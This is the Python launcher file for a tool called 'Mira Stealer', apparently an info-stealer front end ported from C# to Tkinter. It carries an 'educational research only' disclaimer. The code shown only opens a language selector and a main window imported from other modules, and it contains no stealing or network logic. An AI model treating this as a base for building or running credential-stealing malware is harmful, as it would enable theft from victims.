#!/usr/bin/env python3
"""
Mira Stealer - Python Version
Converted from C# WinForms + DevExpress to Python + Tkinter

This software is provided exclusively for educational and ethical research purposes.
- Do NOT use it on real targets or personal machines.
- Do NOT deploy or distribute this code with malicious intent.
- Use only in isolated VMs or malware sandboxes.

The author takes no responsibility for misuse or damages.
"""

import sys
import os
import tkinter as tk
from tkinter import messagebox

# Add the current directory to the Python path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from src.language_selector import LanguageSelector
from src.main_form import MainForm

class Application:
    def __init__(self):
        self.root = None
        
    def run(self):
        """Main application entry point"""
        try:
            # Create the root window (hidden initially)
            self.root = tk.Tk()
            self.root.withdraw()  # Hide root window
            
            # Show language selection dialog
            language_selector = LanguageSelector(self.root)
            selected_language = language_selector.show()
            
            if selected_language:
                # Create and show main form
                main_form = MainForm(self.root, selected_language)
                main_form.show()
                
                # Start the main event loop
                self.root.mainloop()
            else:
                # User cancelled language selection
                self.root.quit()
                
        except Exception as e:
            messagebox.showerror("Application Error", f"Failed to start application: {str(e)}")
            if self.root:
                self.root.quit()

if __name__ == "__main__":
    app = Application()
    app.run()